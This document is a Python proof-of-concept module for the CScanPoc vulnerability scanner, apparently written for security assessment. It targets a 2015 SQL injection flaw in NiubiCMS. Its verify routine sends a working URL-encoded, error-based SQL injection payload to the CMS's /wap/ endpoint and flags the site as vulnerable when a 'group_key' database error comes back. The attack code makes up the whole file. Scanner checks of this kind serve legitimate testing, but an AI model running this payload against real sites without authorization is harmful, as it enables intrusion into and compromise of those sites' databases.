# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'NiubiCMS_0000'  # 平台漏洞编号，留空
    name = 'NiubiCMS通杀SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-26'  # 漏洞公布时间
    desc = '''
        牛逼CMS 地方门户网站源码系统 PHP免费版。功能包含：新闻、房产、人才、汽车、二手、分类信息、交友、商城、团购、知道、论坛、DM读报、优惠券、本地商家、商家名片等功能。 
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3021/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'NiubiCMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b3b65c4b-878b-4969-92d9-5656e8bdc4b6'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/wap/?action=show&mod=admin%20where%20userid=1%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%281,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29--"
            code, head, res, errcode, finalurl = hh.http(arg + payload)

            if code == 200:
                if "for key 'group_key'" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
